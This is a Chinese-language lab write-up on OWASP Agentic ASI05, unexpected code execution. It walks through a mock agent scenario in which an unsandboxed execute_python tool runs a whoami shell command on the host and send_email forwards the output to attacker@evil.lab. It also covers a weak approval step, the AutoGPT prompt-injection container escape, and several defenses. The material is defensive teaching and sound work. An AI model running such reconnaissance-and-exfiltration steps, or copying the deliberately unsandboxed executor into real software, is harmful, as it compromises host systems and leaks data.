# ASI05 意外代码执行：原理、源码与防御

> 本文档解释本项目中的 ASI05：用户只想跑一段受限的维护作业，Agent 却通过 `execute_python` 在宿主机上执行了任意命令，并把输出回传给攻击者。生成代码的是模型，执行代码的是宿主——两者之间没有边界。

---

## 1. 实验要展示什么

用户只提出了正常的请求：

```text
跑一下订单目录的维护作业
```

正常目标应该是：

```text
在受限环境里执行预定义的维护脚本 → 返回执行结果
```

但实际发生的是：

```text
execute_python 以宿主身份执行任意命令（echo uh-oh && whoami）
    ↓
命令输出返回给 Agent
    ↓
send_email 把输出回传 attacker@evil.lab
```

OWASP Agentic AI Top 10（2026）把这一类风险列为 **ASI05:2026 – Unexpected Code Execution (RCE)**：由 Agent 生成或受外部影响的代码在非预期路径上执行，导致提权、持久化、沙箱逃逸乃至主机失陷。官方强调，自然语言到执行路径的新通道（模型输出直接变成可执行代码）创造了新的 RCE 面。

---

## 2. 攻击载荷在哪里

文件：`lab/mock_llm.py`（场景 `asi05_code_exec`）

```python
"asi05_code_exec": [
    {
        "tool": "execute_python",
        "args": {
            "code": "import os; print('意外代码执行: ' + os.popen('echo uh-oh && whoami').read())"
        },
    },
    {
        "tool": "send_email",
        "args": {
            "to": "attacker@evil.lab",
            "subject": "意外代码执行结果回传",
            "body": "agent 在沙箱外执行了任意代码并把输出外泄",
        },
    },
]
```

载荷解析：

| 片段 | 作用 |
|---|---|
| `os.popen('echo uh-oh && whoami')` | 在宿主 shell 里执行系统命令——代码没有停留在"Python 逻辑"层面，而是突破到操作系统层 |
| `whoami` | 侦察：确认代码以哪个用户身份运行（继承宿主用户） |
| `.read()` + `print(...)` | 把宿主命令的输出带回 Agent 上下文，供下一步外发 |
| `send_email` | 把侦察结果送出边界 |

`echo uh-oh && whoami` 看起来无害，但它是占位符：能执行 `whoami` 就能执行任何同权限命令——读任意文件、写启动项、下载载荷，取决于宿主用户的权限。

---

## 3. 漏洞为什么会出现

### 3.1 生成与执行之间没有隔离

链路是：

```text
模型输出文本（不可信）
    ↓
原样作为 code 参数
    ↓
subprocess 在宿主上执行（最高权限路径）
```

模型生成的文本直接变成了操作系统上的进程。中间没有任何一层问过：

```text
这段代码在允许清单里吗？
它只做声明过的那件事吗？
它该以什么身份、在什么环境里运行？
```

### 3.2 执行环境不是沙箱

文件：`lab/tools.py` 中唯一的限制是 10 秒超时：

```python
result = subprocess.run(
    [sys.executable, "-c", code],
    capture_output=True,
    text=True,
    timeout=10,
)
```

没有的东西：

```text
文件系统隔离（可读写宿主任意可访问路径）
网络隔离（可发起任意出站连接）
用户降级（以当前用户全权运行）
系统调用过滤（可用任何 OS 能力）
```

### 3.3 唯一的审批也形同虚设

`execute_python` 在旧版单 Agent 图里属于危险工具，会触发 HITL 审批；但审批提示展示的是 Agent 自己生成的摘要，且演示默认自动批准（详见 ASI09）。于是最后一道人工审批也没能拦住。

所以 ASI05 通常是下面几个问题叠加：

```text
模型输出直接变成可执行代码
+ 执行环境无沙箱、无权限降级
+ 无资源与网络限制
+ 人工审批流于形式
```

---

## 4. 一个简单的 Mock 示例

```python
def mock_agent(user_request: str) -> str:
    # 用户原始目标：运行预定义的维护脚本
    if user_request == "跑一下维护作业":
        return run_script("maintenance.py")   # 受限路径

    # [VULN] Agent 改为现场生成代码并交给宿主执行
    output = execute_python(
        "import os; print(os.popen('echo uh-oh && whoami').read())"
    )
    send_email("attacker@evil.lab", "执行结果回传", output)
    return "任务完成"
```

正常路径：

```text
运行预先审计过的脚本文件 → 输出可控 → 无副作用
```

意外执行路径：

```text
模型现场写代码 → 宿主直接执行 → 任意命令 → 输出外泄
```

关键区别不在代码内容，而在**执行契约**：预定义脚本有审计与边界，现场生成的代码两者皆无。

---

## 5. 真实源码中的关键漏洞点

### 5.1 任意代码以宿主身份执行

文件：`lab/tools.py`

```python
def execute_python(code: str) -> str:
    result = subprocess.run(
        [sys.executable, "-c", code],
        capture_output=True,
        text=True,
        timeout=10,
    )
    return result.stdout or result.stderr
```

关键问题是：

```python
[sys.executable, "-c", code]
```

`-c` 表示把 `code` 字符串当作完整程序执行。`code` 来自模型输出，模型输出可以被提示注入、记忆投毒或供应链载荷操纵（ASI01 / ASI06 / ASI04 都能把任意文本送进这个参数）。这个工具因此成为所有上游漏洞的**汇点**：别的漏洞负责把恶意代码送进来，它负责让代码成真。

### 5.2 宿主命令执行与输出回传

场景中的代码：

```python
import os
print('意外代码执行: ' + os.popen('echo uh-oh && whoami').read())
```

`os.popen` 打开宿主 shell。执行结果进入工具返回值：

```text
工具返回值 → Agent 上下文 → send_email body → outbox
```

宿主的敏感信息（当前用户名等）就这样流出了边界。

### 5.3 危险工具的审批只是提示

文件：`lab/graph.py`

```python
DANGEROUS_TOOLS = {"send_email", "execute_python"}
```

```python
if name in DANGEROUS_TOOLS:
    summary = (
        call["args"].get("body")
        or call["args"].get("instruction")
        or call["args"].get("code")
        or f"执行 {name}"
    )
    decision = interrupt(
        {
            "tool": name,
            "action_summary": summary,
            "note": "请审批此操作（注意：此描述由 agent 自行生成）",
        }
    )
    if not decision:
        results.append(f"[denied] {name} 被审批者拒绝")
        continue
```

审批机制存在，但摘要由被审批方生成、演示默认放行。审批的前提应当是审批者能看到并理解**原始动作**，这在 ASI09 里详细展开。

---

## 6. 现实世界中的黑盒案例

### AutoGPT 意外代码执行（2023 起，OWASP 官方引用）

positive.security 的研究演示：通过**间接提示注入**诱导 Auto-GPT 在执行"看似无害的任务"时运行任意代码，并实现 **Docker 容器逃逸**。CVE-2023-37274 则显示：当用户用 run.sh/run.bat 把 Auto-GPT 直接跑在宿主机上时，沙箱不完整，攻击者可绕过沙箱执行任意代码。OWASP 2026 把 AutoGPT RCE 列为 ASI05 的代表案例——"自然语言到执行路径的新通道创造了新的 RCE 面"。

来源：

- [positive.security: Hacking Auto-GPT and Escaping Its Docker Container](https://positive.security/blog/auto-gpt-rce)
- [NVD: CVE-2023-37274](https://nvd.nist.gov/vuln/detail/CVE-2023-37274)
- [GitHub Advisory GHSA-4crw-9p35-9x54](https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-4crw-9p35-9x54)

---

## 7. 防御代码如何阻止攻击

### 7.1 防御一：生成与执行分离，脚本走预定义清单

生产方向（本项目未实现 safe 变体）：

```python
APPROVED_SCRIPTS = {
    "order_maintenance": "scripts/order_maintenance.py",
}

def execute_approved_script(script_id: str) -> str:
    # Agent 只能指定"要跑哪个已审计脚本"，不能提交代码文本
    path = APPROVED_SCRIPTS.get(script_id)
    if not path:
        return f"[blocked] 脚本不在批准清单内: {script_id}"
    return run_in_sandbox(path)
```

变化的核心：

```text
参数从"任意代码文本"收敛为"脚本 ID"
代码内容来自磁盘上被审计过的文件，而不是模型输出
```

### 7.2 防御二：受限沙箱执行

必须执行动态代码时（生产建议）：

```text
独立容器运行，非 root 用户
只读根文件系统，唯一可写目录为临时工作区
无出站网络（或仅白名单端点）
CPU / 内存 / 时长资源上限
执行日志全量留存并关联审计
```

在这些约束下，场景里的载荷会失败：

```text
os.popen('...') → 无 shell 或被系统调用过滤拦截
whoami          → 即使执行，输出也无法外发（无出站网络）
```

### 7.3 防御三：出口白名单兜底

文件：`lab/tools.py`

```python
def send_email_safe(to: str, subject: str, body: str) -> str:
    if to not in ALLOWED_RECIPIENTS:
        return f"[blocked] 收件人不在白名单内: {to}"
    return send_email(to, subject, body)
```

即使代码执行成功、输出被拿到，回传通道也被阻断。

### 7.4 现实世界的防御研究

以下防御思路来自公开的安全研究与事故分析，不依赖本项目：

| 防御思路 | 具体做法 | 来源 |
|---|---|---|
| 细粒度网络管控 | 联网应是显式声明的例外而不是默认——"主动证明需要联网，而非默认放行" | [UK AISI 事件报告](https://www.aisi.gov.uk/blog/incident-report-unsanctioned-agent-behaviour-during-cyber-testing) |
| 实时行为监控 | 部署能在运行中标记或阻断越界动作的监控，而不是事后审计 | 同上 |
| 按任务定制沙箱 | 隔离强度按评估/任务定制，"好的隔离不应依赖模型选择不去试探边界" | 同上 |
| 生成与执行分离 | 模型产出代码与真正执行之间必须有一个独立检查层 | [positive.security: AutoGPT RCE](https://positive.security/blog/auto-gpt-rce) |

---

## 8. 防御前后对比

### 无防御

```text
跑一下订单目录的维护作业
    ↓
模型现场生成代码
    ↓
execute_python → subprocess 在宿主执行
    ↓
os.popen('echo uh-oh && whoami') 拿到宿主信息
    ↓
send_email("attacker@evil.lab", ...)
    ↓
写入 outbox
```

结果：

```text
宿主任意代码执行成立
执行结果外泄
```

### 启用防御

```text
跑一下订单目录的维护作业
    ↓
execute_approved_script("order_maintenance")
    ↓
执行的是磁盘上被审计的脚本，模型代码无处提交
    ↓
沙箱内运行：无 shell、无出站网络、非 root
    ↓
即使有输出 → send_email_safe 白名单阻断
```

结果：

```text
没有意外代码执行
没有外发记录
```

---

## 9. 一句话总结

```text
模型生成的文本被原样交给了宿主解释器：生成端不可信、执行端无边界、审批端又流于形式，一条 whoami 命令就完成了从"自然语言"到"主机失陷"的直达通道。
```

防御的核心是：

> 默认不允许模型输出直接变成可执行代码；必须动态执行时，把代码关进非 root、无网络、只读文件系统的沙箱，并让出口通道独立可拦截。
